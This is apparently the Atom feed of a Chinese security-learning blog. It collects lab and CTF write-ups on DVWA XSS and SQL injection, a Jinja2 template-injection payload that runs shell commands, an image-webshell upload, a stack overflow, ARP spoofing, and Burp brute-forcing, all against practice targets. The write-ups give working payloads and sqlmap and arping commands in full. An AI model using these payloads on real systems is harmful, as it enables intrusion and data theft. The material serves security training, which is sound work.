<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-14T17:56:44.281Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[DVWA练习(XSS)]]></title>
        <id>https://z0ekball.github.io/post/dvwaxss/</id>
        <link href="https://z0ekball.github.io/post/dvwaxss/">
        </link>
        <updated>2021-11-15T15:44:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="xssreflected-low">XSS(Reflected)-Low</h2>
<p>查看源码，对name参数没有任何过滤和检查<br>
​                         <img src="https://z0ekball.github.io/post-images/image-20220415014029290.png" alt="image-20220415014029290" loading="lazy"></p>
<p>输入一段JavaScript代码：<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，返回一个弹窗，攻击成功</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415014034811.png" alt="image-20220415014034811" loading="lazy"></figure>
<p>获取cookie:<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415014038390.png" alt="image-20220415014038390" loading="lazy"></figure>
<h2 id="xssreflected-medium">XSS(Reflected)- Medium</h2>
<p>查看源码，发现存在对script的简单过滤，匹配<code>&lt;script&gt;</code>换成null，只执行一次</p>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415014047015.png" alt="image-20220415014047015" loading="lazy"></figure>
<p>采用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert('xss')&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415014050608.png" alt="image-20220415014050608" loading="lazy"></figure>
<h2 id="xssreflected-high">XSS(Reflected)-High</h2>
<p>查看源码，采用正则表达式过滤，故无法使用大小写绕过和双写绕过</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415014058357.png" alt="image-20220415014058357" loading="lazy"></figure>
<p>换一种标签，输入：<code>&lt;img src=&quot;&quot; onerror=&quot;alert('xss')&quot;&gt;</code>，攻击成功</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415014101999.png" alt="image-20220415014101999" loading="lazy"></figure>
<h2 id="xssstored-low">XSS(Stored)-Low</h2>
<p>输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，有弹窗</p>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415014119504.png" alt="image-20220415014107878" loading="lazy"></figure>
<p>输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code>，设计一个按钮打开弹窗</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415014125565.png" alt="image-20220415014125565" loading="lazy"></figure>
<p>输入<code>&lt;a href=http://www.bilibili.com&gt;click&lt;/a&gt;</code>，按下按钮打开bilibili网页</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415014129626.png" alt="image-20220415014129626" loading="lazy"></figure>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，返回页面cookie</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415014136222.png" alt="image-20220415014136222" loading="lazy"></figure>
<h2 id="xssstored-medium">XSS(Stored)-Medium</h2>
<p>查看源码，message参数把需要转义的字符进行转义防止了xss攻击</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415014216650.png" alt="image-20220415014216650" loading="lazy"></figure>
<p>转义结果</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415014144308.png" alt="image-20220415014144308" loading="lazy"></figure>
<p>name参数对<code>&lt;script&gt;</code>有简单过滤，替换第一个<code>&lt;script&gt;</code>，且限制输入10个字符</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415014226987.png" alt="image-20220415014226987" loading="lazy"></figure>
<p>抓包，进行简单绕过</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415014233230.png" alt="image-20220415014233230" loading="lazy"></figure>
<p>编码成url</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415014238817.png" alt="image-20220415014238817" loading="lazy"></figure>
<p>成功执行</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415014242586.png" alt="image-20220415014242586" loading="lazy"></figure>
<p>获取cookie</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415014249018.png" alt="image-20220415014249018" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415014317151.png" alt="image-20220415014258608" loading="lazy"></figure>
<h2 id="xssstored-high">XSS(Stored)-High</h2>
<p>查看源码，在medium的基础上对script进行严格过滤</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415014343501.png" alt="image-20220415014343501" loading="lazy"></figure>
<p>不使用script即可，输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code></p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415014350676.png" alt="image-20220415014350676" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415014357200.png" alt="image-20220415014357200" loading="lazy"></figure>
<p>攻击成功</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415014402390.png" alt="image-20220415014402390" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(SQL Injection)]]></title>
        <id>https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/</id>
        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/">
        </link>
        <updated>2021-10-26T17:30:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="sql-injection-low">SQL Injection-Low</h2>
<p>抓包<br>
<img src="https://z0ekball.github.io/post-images/image-20220415011925419.png" alt="image-20220415011925419" loading="lazy"></p>
<p>直接用<code>sqlmap</code></p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415011952778.png" alt="image-20220415011952778" loading="lazy"></figure>
<p>说明需要上传cookie，加上抓包的cookie即可</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415012023569.png" alt="image-20220415012023569" loading="lazy"></figure>
<p>爆表：</p>
<pre><code class="language-sql">
sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa –tables
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415012047969.png" alt="image-20220415012047969" loading="lazy"></figure>
<p>爆列：</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users –columns
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415012103755.png" alt="image-20220415012103755" loading="lazy"></figure>
<p>爆字段：</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users -C user,password –dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415012118950.png" alt="image-20220415012118950" loading="lazy"></figure>
<h2 id="sql-injection-medium">SQL Injection-Medium</h2>
<p>抓包，post方式提交数据</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415012132436.png" alt="image-20220415012132436" loading="lazy"></figure>
<p>把包保存到本地，用sqlmap注入</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt –dbs查库
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415012146073.png" alt="image-20220415012146073" loading="lazy"></figure>
<p>和low一样的操作查后续信息</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa –tables查表
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415012152768.png" alt="image-20220415012152768" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users –columns查列
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415012208701.png" alt="image-20220415012208701" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users -C user,user_id --dump
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415012222670.png" alt="image-20220415012222670" loading="lazy"></figure>
<h2 id="sql-injection-high">SQL Injection-High</h2>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415012231790.png" alt="image-20220415012231790" loading="lazy"></figure>
<p>抓包，尝试手注</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415012324805.png" alt="image-20220415012324805" loading="lazy"></figure>
<p>回显两个数据，说明有两个注入点</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415012355929.png" alt="image-20220415012355929" loading="lazy"></figure>
<pre><code class="language-sql">查数据库：1' union select 1,database()#
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415012400865.png" alt="image-20220415012400865" loading="lazy"></figure>
<pre><code class="language-sql">查表：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，报错
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415012441759.png" alt="image-20220415012441759" loading="lazy"></figure>
<p>没能解决这个问题，换一个思路，用sqlmap</p>
<p>抓包保存，由于题目在弹出的窗口上写入注入语句，在原来的网页回显，所以要设置重定向的网络</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post2.txt --second-url &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/&quot; –dbs
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415012454901.png" alt="image-20220415012454901" loading="lazy"></figure>
<p>后续步骤和前面的两题相同</p>
<h2 id="sql-injection-blind-low">SQL Injection (Blind)-Low</h2>
<p>无过滤get盲注</p>
<pre><code class="language-sql">1' and (length(database())&gt;3 and length(database())&lt;5)#
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415012520420.png" alt="image-20220415012520420" loading="lazy"></figure>
<p>说明数据库长度为4</p>
<pre><code class="language-sql">1’ and ascii(substr(database(),1,1))=100#
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415012525108.png" alt="image-20220415012525108" loading="lazy"></figure>
<p>说明数据库第一个字母为d</p>
<p>结合脚本爆破数据库名：</p>
<p>抓包获取url和cookie，加入请求头</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415012554111.png" alt="image-20220415012554111" loading="lazy"></figure>
<p>修改注入字段得到查表脚本：</p>
<pre><code class="language-sql">inner = &quot;?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u %%23&amp;Submit=Submit#&quot;
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415012622039.png" alt="image-20220415012622039" loading="lazy"></figure>
<h2 id="sql-injection-blind-medium">SQL Injection (Blind)-Medium</h2>
<p>有过滤post盲注</p>
<p>结合burpsuite和脚本进行注入：id=1 and 1=1#&amp;Submit=Submit</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415012639939.png" alt="image-20220415012639939" loading="lazy"></figure>
<p>burpsuite爆破库长度</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415012657971.png" alt="image-20220415012657971" loading="lazy"></figure>
<p>简单数字爆破</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415012703391.png" alt="image-20220415012703391" loading="lazy"></figure>
<p>返回长度判断长度为4</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415012707835.png" alt="image-20220415012707835" loading="lazy"></figure>
<p>脚本爆破库名</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415012745679.png" alt="image-20220415012745679" loading="lazy"></figure>
<p>类似low，爆破表名：</p>
<pre><code class="language-sql">inner = &quot;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u #&quot;
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415012802867.png" alt="image-20220415012802867" loading="lazy"></figure>
<h2 id="sql-injection-blind-high">SQL Injection (Blind)-High</h2>
<p>把提交数据和回显数据分开输入与返回，有效加大了脚本注入的难度，采用手注</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415012825557.png" alt="image-20220415012825557" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())&gt;4#
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415012833176.png" alt="image-20220415012833176" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())=4#
</code></pre>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415012847028.png" alt="image-20220415012847028" loading="lazy"></figure>
<p>库名长为4</p>
<p>后续注入和前面相同</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[秋季赛WP]]></title>
        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
        </link>
        <updated>2021-10-20T12:25:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="秋季赛wp">秋季赛WP</h1>
<p>一个人就是一支队伍</p>
<h2 id="web">WEB</h2>
<h3 id="easy-ssti">Easy-ssti</h3>
<p>服务器模板注入，jinja2漏洞，{{7*7}}有回显说明有注入漏洞，_和[被过滤，用require函数结合attr绕过。<br>
Jinja2模板参考<br>
<a href="http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html%23builtin-filters">http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html#builtin-filters</a></p>
<p>注入语句：</p>
<pre><code class="language-php">{{lipsum|attr(request.args.a)|attr(&quot;get&quot;)(request.args.b)|attr(&quot;get&quot;)(&quot;e&quot;+&quot;val&quot;) (request.args.c)}}&amp;a=globals&amp;b=builtins&amp;c=import(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()

&quot;e&quot;+&quot;val&quot; ‘o’+’s’ “编码”.decode(‘base64’)绕过敏感字
</code></pre>
<h3 id="easy-sql1">Easy-sql1</h3>
<p>常规的1’/<strong>/or/</strong>/1&gt;0#和order by之后，经历一番绕过得出能运行的注入语句：</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/database(),2)#&amp;password=
</code></pre>
<p>得到数据库名<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200716689.png" alt="" loading="lazy"></p>
<p>因为=被过滤，不想麻烦绕过就直接爆出整个表名</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/group_concat(table_name),2/**/from/**/information_schema.tables)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414200726337.png" alt="" loading="lazy"></figure>
<p>查找到含flag的表名:flag_table_1</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220414200749595.png" alt="" loading="lazy"></figure>
<p>得flag</p>
<h3 id="easy-ez_upload">Easy-ez_upload</h3>
<p>用御剑扫描目录<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200819812.png" alt="" loading="lazy"><br>
访问/robot.txt<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201035855.png" alt="" loading="lazy"></p>
<p>得文件上传地址,只允许图片上传。用一句话木马攻击，尝试各种方法都没法上传成php格式后,尝试图马。一开始直接把一句话木马写在图片末尾，上传后发现被过滤掉了，考虑二次渲染。网上说png、jpeg不好改，用gif改。用winhex对比原gif和二次渲染过的gif找出相同的字段，插入木马。<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201044815.png" alt="" loading="lazy"><br>
上传图片，木马没有被过滤，但图片还是以gif格式解析，蚁剑无法连接…卡了好久之后看原来黑屏的网页<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201056641.png" alt="" loading="lazy"></p>
<p>明明有提示文件包含我却没看…</p>
<p>利用文件包含漏洞，使gif以php格式解析，访问<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201118117.png" alt="" loading="lazy"><br>
蚁剑终于连接成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201126951.png" alt="" loading="lazy"><br>
找不到flag文件，用命令行试试<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201206436.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201222636.png" alt="" loading="lazy"></p>
<p>找到flag</p>
<h3 id="medium-web4">Medium-web4</h3>
<p>布尔盲注，感觉出题人应该是个好人，所以猜测是同一个库，尝试题目sql1的注入语句</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<p>回显是good，说明猜对了</p>
<pre><code>username=1'or(length(database())&gt;6)#&amp;password=   good
username=1'or(length(database())&gt;7)#&amp;password=   try again
</code></pre>
<p>库名长度为7，猜应该是cumtctf，脚本爆破验证一下<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201316832.png" alt="" loading="lazy"></p>
<p>没猜错，因为sql1的语句回显是good，猜测flag还是在flag_table_1</p>
<p>因为=被过滤，判断字符用&lt;和&gt;绕过</p>
<pre><code>username=1'or(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&gt;0)%26%26(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&lt;125)#&amp;password=
</code></pre>
<p>回显good，说明又猜对了，上脚本爆破得flag（脚本绕过语句存在注释符,所以和手注有区别，绕过空格不能用/**/,而用/<em>!</em>/），flag长度猜大一点<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201336573.png" alt="" loading="lazy"></p>
<h2 id="re">RE</h2>
<h3 id="easy-签到">Easy-签到</h3>
<p>ida常规通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201406640.png" alt="" loading="lazy"><br>
16进制解码得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201446312.png" alt="" loading="lazy"></p>
<h3 id="easy-net">Easy-net</h3>
<p>提示net，因为没有.net环境，无法看运行情况，但用ILSpy能直接反编译函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201548593.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201600870.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201636689.png" alt="" loading="lazy"></p>
<p>大致意思就是一个字符串经过一系列运算，能经过最后一个if判断。逆向爆破可以得到这个字符串，问题是不知道字符串长度。但经过算法OJ题的轮番折磨，我知道array2[j]里的j不能超过该数组长度28（array2有28个数），所以j最大值即字符串长度为28。</p>
<p>这就好办了，上脚本爆破得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201654601.png" alt="" loading="lazy"></p>
<h2 id="pwn">PWN</h2>
<h3 id="easy-pwn1">Easy-pwn1</h3>
<p>Nc一下，cat flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201725664.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn2">Easy-pwn2</h3>
<p>标准栈溢出，buf是0x40h但要读入0x60h的数据，参考攻防世界栈溢出的题解写脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201801302.png" alt="" loading="lazy"><br>
Call system地址<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201819493.png" alt="" loading="lazy"><br>
填充0x48覆盖buf和push内容，再覆盖返回地址，脚本：<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201828914.png" alt="" loading="lazy"><br>
执行<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201839150.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn3">Easy-pwn3</h3>
<p>exeinfo查了一下, 32位<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201911585.png" alt="" loading="lazy"></p>
<p>用ida32打开，通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201924140.png" alt="" loading="lazy"></p>
<p>查资料时发现博客</p>
<p><a href="https://blog.csdn.net/weixin_44145820/article/details/105482269">(10条消息) BUUCTF-PWN刷题记录-6_L.o.W的博客-CSDN博客</a></p>
<p>不能说毫无相关，简直就是一模一样…</p>
<p>先填充满缓冲区，泄露ebp，然后使用栈迁移执行system，运行得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201935583.png" alt="" loading="lazy"></p>
<h2 id="crypto">Crypto</h2>
<h3 id="easy-签到-2">Easy-签到</h3>
<p>逆向爆破，懒得判断数字和符号，爆出来再加上就是flag</p>
<p>脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202014958.png" alt="" loading="lazy"><br>
加上数字和符号<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202025543.png" alt="" loading="lazy"></p>
<h3 id="easy-lcg">Easy-lcg</h3>
<p>LCG就是线性同余法，得到的是弱伪随机数，参考lcg教程</p>
<p>http://www.manongjc.com/detail/22-hpzrquvdaforjqj.html</p>
<p>参考里面的脚本，运行得到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202049990.png" alt="" loading="lazy"></p>
<h2 id="misc">Misc</h2>
<h3 id="easy-签到-3">Easy-签到</h3>
<p>base32解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202112612.png" alt="" loading="lazy"></p>
<h3 id="easy-lsb">Easy-LSB?</h3>
<p>LSB隐写，Stegslove多次尝试修改低位的0、1，如图拿到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202129805.png" alt="" loading="lazy"></p>
<h3 id="easy-压缩包">Easy-压缩包</h3>
<p>有点阴间的题目，第一个压缩包就是伪加密，HXD打开修改全局方式位标记为00 00，能够打开压缩包，得到下一个压缩包。HXD查看是真加密，根据提示用ziperello爆破得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202148412.png" alt="" loading="lazy"></p>
<p>又得到了真两个加密文件，卡了好久之后想起加密的图在别的题里有原图，对比两这的冗余码，确认是同一个文件。一个已知解密文件和一个相同的加密文件不就是明文攻击嘛。</p>
<p>把已知图片压缩成包，ARCHPR明文攻击得密码，解开的flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202156116.png" alt="" loading="lazy"></p>
<h3 id="easy-加密">Easy-加密？</h3>
<p>套娃加密题，图片是福尔摩斯密码，解密得到密码SHERLOCK</p>
<p>第二个压缩包的txt文件是零宽字符加密，解密得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202220004.png" alt="" loading="lazy"></p>
<p>打开flag文件, base16解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202227205.png" alt="" loading="lazy"></p>
<h3 id="medium-社工">Medium-社工？</h3>
<p>一开始用微信QQ扫码都没用，就着jpeg研究了好久还是解不出，直到我知道一个叫中国编码的东东…<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202251180.png" alt="" loading="lazy"></p>
<p>WANG/JIA就是这个人的名字，也就拿到了flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ARP欺骗实验]]></title>
        <id>https://z0ekball.github.io/post/arp-qi-pian-shi-yan/</id>
        <link href="https://z0ekball.github.io/post/arp-qi-pian-shi-yan/">
        </link>
        <updated>2021-10-14T15:59:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2>
<p><code>网关</code>：IP:192.168.89.2     MAC: 00:50:56:fd:c6:0f</p>
<p><code>攻击机</code>：IP: 192.168.89.129   MAC: 00:0c:29:e8:f7:fa<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235504335.png" alt="" loading="lazy"></p>
<p><code>靶机</code>：IP：192.168.89.130   MAC：00:0c:29:2f:af:50<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235510538.png" alt="" loading="lazy"></p>
<p>攻击机fping -g查看存活主机<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235516996.png" alt="" loading="lazy"></p>
<p>查勘表靶机arp缓存表<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235520684.png" alt="" loading="lazy"></p>
<h2 id="攻击过程">攻击过程</h2>
<p>使用<code>arping</code>进行攻击</p>
<pre><code>arping -S 192.168.89.2 -s 00:00:00:00:00:00 192.168.89.130
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414235527380.png" alt="" loading="lazy"></figure>
<p>靶机ping baidu.com失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235624766.png" alt="" loading="lazy"></p>
<p>arp -a查看mac地址，网关已改变，攻击成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235632373.png" alt="" loading="lazy"></p>
<p>只要把网关MAC改为正确地址，即可解除攻击<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235656428.png" alt="" loading="lazy"></p>
<p>靶机正常访问baidu.com，网关MAC正常<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235651949.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(Brute-Force)]]></title>
        <id>https://z0ekball.github.io/post/dvwa-lian-xi-brute-force/</id>
        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-brute-force/">
        </link>
        <updated>2021-09-29T08:03:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="brute-force-low">Brute Force-Low</h2>
<p><img src="https://z0ekball.github.io/post-images/image-20220415005815758.png" alt="" loading="lazy"><br>
随便输入，burpsuite抓取，发送到instuder，选取爆破目标<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005820686.png" alt="" loading="lazy"><br>
选择爆破方式，这里选择<code>Cluster bomb</code>适用于两个参数的爆破<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005825553.png" alt="" loading="lazy"><br>
分别设置两个参数的爆破格式，选择<code>simple list</code>，添加爆破字典<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005836345.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005832746.png" alt="" loading="lazy"><br>
开始爆破，length降序排序找到唯一不同的页面，就是账号和密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005840823.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005851995.png" alt="" loading="lazy"></p>
<h2 id="brute-force-medium">Brute Force-Medium</h2>
<p>当账号密码错误时，页面延迟两秒再显示，猜测后台存在延时<code>sleep()</code>函数，同样使用burpsuite爆破<br>
